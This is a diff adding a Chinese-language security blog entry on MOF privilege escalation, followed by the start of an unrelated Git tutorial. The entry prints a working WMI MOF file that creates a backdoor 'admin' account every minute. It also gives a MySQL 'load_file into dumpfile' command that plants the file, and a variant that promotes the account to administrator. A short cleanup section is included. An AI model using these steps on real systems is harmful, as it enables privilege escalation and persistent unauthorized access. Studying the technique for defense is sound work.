@@ -3,6 +3,71 @@
   
     
     <entry>
+      <title><![CDATA[提权学习(四) MOF提权]]></title>
+      <url>/2017/08/13/%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0(%E5%9B%9B)%20MOF%E6%8F%90%E6%9D%83/</url>
+      <content type="html"><![CDATA[<h3 id="mof-提权"><a href="#mof-提权" class="headerlink" title="mof 提权"></a>mof 提权</h3><h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p><strong><code>mof</code>文件是 <code>Windows 管理规范</code> 存储库中的托管对象格式文件。Windows 管理规范缩写为：WMI</strong></p>
+<p><strong><code>Windows 管理规范</code> 提供了三种方式去编译 <code>mof</code> 文件</strong></p>
+<pre><code>方法一：运行 Mofcomp.exe 文件，将要编译的 mof 文件作为命令行参数去执行
+
+方法二：使用 IMofCompiler 接口和 $CompileFile 方法
+
+方法三：将 mof 文件拖放到 %SystemRoot%\System32\Webm\MOF 文件夹下，即 C:/Windows/system32/webm/mof 目录 
+</code></pre><p><strong>Microsoft 建议到 WMI 存储库编译 <code>mof</code> 文件使用前两种方法，即执行 <code>Mofcomp.exe</code> 文件或者使用 <code>IMofCompiler::CompileFile</code> 方法。第三种方法仅为向后兼容性和早期的 WMI 提供，而且此功能可能不会提供在将来的版本中，所以 Microsoft 不建议使用。</strong></p>
+<p><strong>而 <code>mof</code> 提权也恰恰是利用了这第三种方法。在 <code>C:/windows/system32/webm/mof</code> 目录下的 <code>nullevt.mof</code> 文件每分钟都会在一个特定的时间被调用执行一次，所以如果 <code>nullevt.mof</code> 文件被做了修改，在文件中直接写入了添加用户等命令，当 <code>nullevt.mof</code> 被调用执行时，用户就会自动被添加，以达到提权的效果。</strong></p>
+<h4 id="0x02-具体流程"><a href="#0x02-具体流程" class="headerlink" title="0x02 具体流程"></a>0x02 具体流程</h4><p><strong>1.寻找可读写目录将我们自己生成的 <code>mof</code> 文件上传到寻找到的可读写目录中，生成的 <code>mof</code> 文件如下</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) instance of __EventFilter as $EventFilter &#123;     EventNamespace = &quot;Root\\Cimv2&quot;;     Name  = &quot;filtP2&quot;;     Query = &quot;Select * From __InstanceModificationEvent &quot;             &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;             &quot;And TargetInstance.Second = 5&quot;;     QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123;     Name = &quot;consPCSV2&quot;;     ScriptingEngine = &quot;JScript&quot;;     ScriptText =     &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123;     Consumer   = $Consumer;     Filter = $EventFilter; &#125;;</div></pre></td></tr></table></figure>
+<p><strong>2.执行 <code>loadfile</code> 及 <code>into dumpfile</code> 把上传到可读写目录，我们已经事先编辑好的 <code>mof</code> 文件导出到 <code>C:/windows/system32/webm/mof</code></strong> </p>
+<pre><code>select load_file(&apos;C:\\RECYCLER\\nullevt.mof&apos;) into dumpfile &apos;c:\\windows\\system32\\wbem\\mof\\nullevt.mof&apos;;
+</code></pre><p><strong>注意：在执行导出mof文件时，<code>路径</code> 要加双斜杠 <code>\\</code></strong></p>
+<h4 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h4><p><strong>1.导出的 <code>nullevt.mof</code> 会在每分钟的特定时间被调用(可以自己设置)，我们上传的 <code>nullevt.mof</code> 文件代码中有这么一行，该代码的作用就是使该文件在每分钟的第 5 秒的时候被调用执行</strong></p>
+<blockquote>
+<p>“And TargetInstance.Second = 5”;</p>
+</blockquote>
+<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%831.png" alt=""></p>
+<p><strong>一旦该文件被调用执行，就会为系统再添加一个用户</strong></p>
+<p><img src="http://oujzxyfkr.bkt.clouddn.com/yzczzh09mof%E6%8F%90%E6%9D%832.png" alt=""></p>
+<p><strong>当然用户名和密码都可以自定义，在 nulevt.mof 文件中可以修改用户名和密码的代码如下</strong></p>
+<blockquote>
+<p>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe user admin admin /add\”)”;</p>
+</blockquote>
+<p><strong>我们发现其实在 <code>nulevt.mof</code> 文件中添加用户的语句还是普通的提权添加用户语句，只是把它放在了 nulevt.mof 文件中，当 <code>nulevt.mof</code> 文件 被执行时，添加用户的语句也会被执行。</strong></p>
+<p><strong>这个文件被执行完之后只会成功添加一个普通的用户，如果还需要把该用户添加到 <code>administrator</code> 管理员组中的话，只需要把刚刚添加用户的命令修改成把用户添加到管理员组的命令即可，修改完之后再上传导出该文件到 <code>C:/Windows/system32/webm/mof</code> 目录，当该文件被再次执行过后，就会把普通用户添加到 <code>administrator</code> 组中了。</strong></p>
+<blockquote>
+<p>“var WSH = new ActiveXObject(\”WScript.Shell\”)\nWSH.run(\”net.exe localgroup administrator admin /add\”)”;</p>
+</blockquote>
+<h4 id="0x04-解决方法"><a href="#0x04-解决方法" class="headerlink" title="0x04 解决方法"></a>0x04 解决方法</h4><p><strong>将 nullevt.mof 文件导出到 <code>C:/Windows/system32/webm/mof</code> 目录下以后，若是想让系统停止调用执行 <code>nullevt.mof</code> 文件的话，光删除它是不行的，需要如下步骤才可以彻底停止</strong></p>
+<ul>
+<li><p><strong>1 停止服务</strong></p>
+<pre><code>net stop winmgmt
+</code></pre></li>
+<li><p><strong>2 删除 <code>C:\WINDOWS\system32\wbem\Repository\</code> 文件夹</strong></p>
+</li>
+<li><p><strong>3 重新启动服务</strong></p>
+<pre><code>net start winmgmt
+</code></pre><p><strong><code>C:/Windows/system32/webm/mof</code> 文件夹下放的是 <code>Windows 管理规范</code> 的存储库，执行的 <code>.mof</code> 文件都会被加入到这个库中，然后一直会按照我们放入的 <code>nullevt.mof</code> 文件去执行，所以即使删掉了 <code>C:/Windows/system32/webm/mof</code> 目录下的 <code>.mof</code> 文件，系统照样会继续执行，只有停止服务后，把 <code>WMI</code> 的存储库删掉，再重启服务，系统就会重建一个默认的存储库，只有这样才能彻底解决掉这个问题(需要事先把 <code>C:/Windows/system32/webm/mof</code> 目录下的 <code>.mof</code> 文件删掉)</strong></p>
+</li>
+</ul>
+<p>参考文章</p>
+<p><a href="https://www.waitalone.cn/mysql-tiquan-summary.html" target="_blank" rel="external">MYSQL提权总结</a></p>
+<p><a href="http://www.myhack58.com/Article/html/3/8/2013/38264.htm" target="_blank" rel="external">MOF文件提权</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 提权 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> MOF提权 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Git 命令行操作的介绍]]></title>
       <url>/2017/08/05/git%20%E5%91%BD%E4%BB%A4/</url>
       <content type="html"><![CDATA[<h3 id="Git-命令"><a href="#Git-命令" class="headerlink" title="Git 命令"></a>Git 命令</h3><h4 id="0x01-Git-的介绍"><a href="#0x01-Git-的介绍" class="headerlink" title="0x01 Git 的介绍"></a>0x01 Git 的介绍</h4><p><strong>Git 是 Linux 的创始人 Linus Torvalds 开源的一款分布式版本控制系统，以帮助开发者更好的对项目进行版本管理。每一个优秀的开发者在进行项目开发时都会第一时间给自己的项目加上 Git，以便能更好的追踪代码修改，进行版本回溯等操作。在多人协作的开发过程中，Git 更是必不可少的。因此，本书中将使用 Git 来管理项目的所有代码，让你在阅读本书的时候能够体会到 Git 的强大，了解实际开发中我们对 Git 的应用。</strong></p>
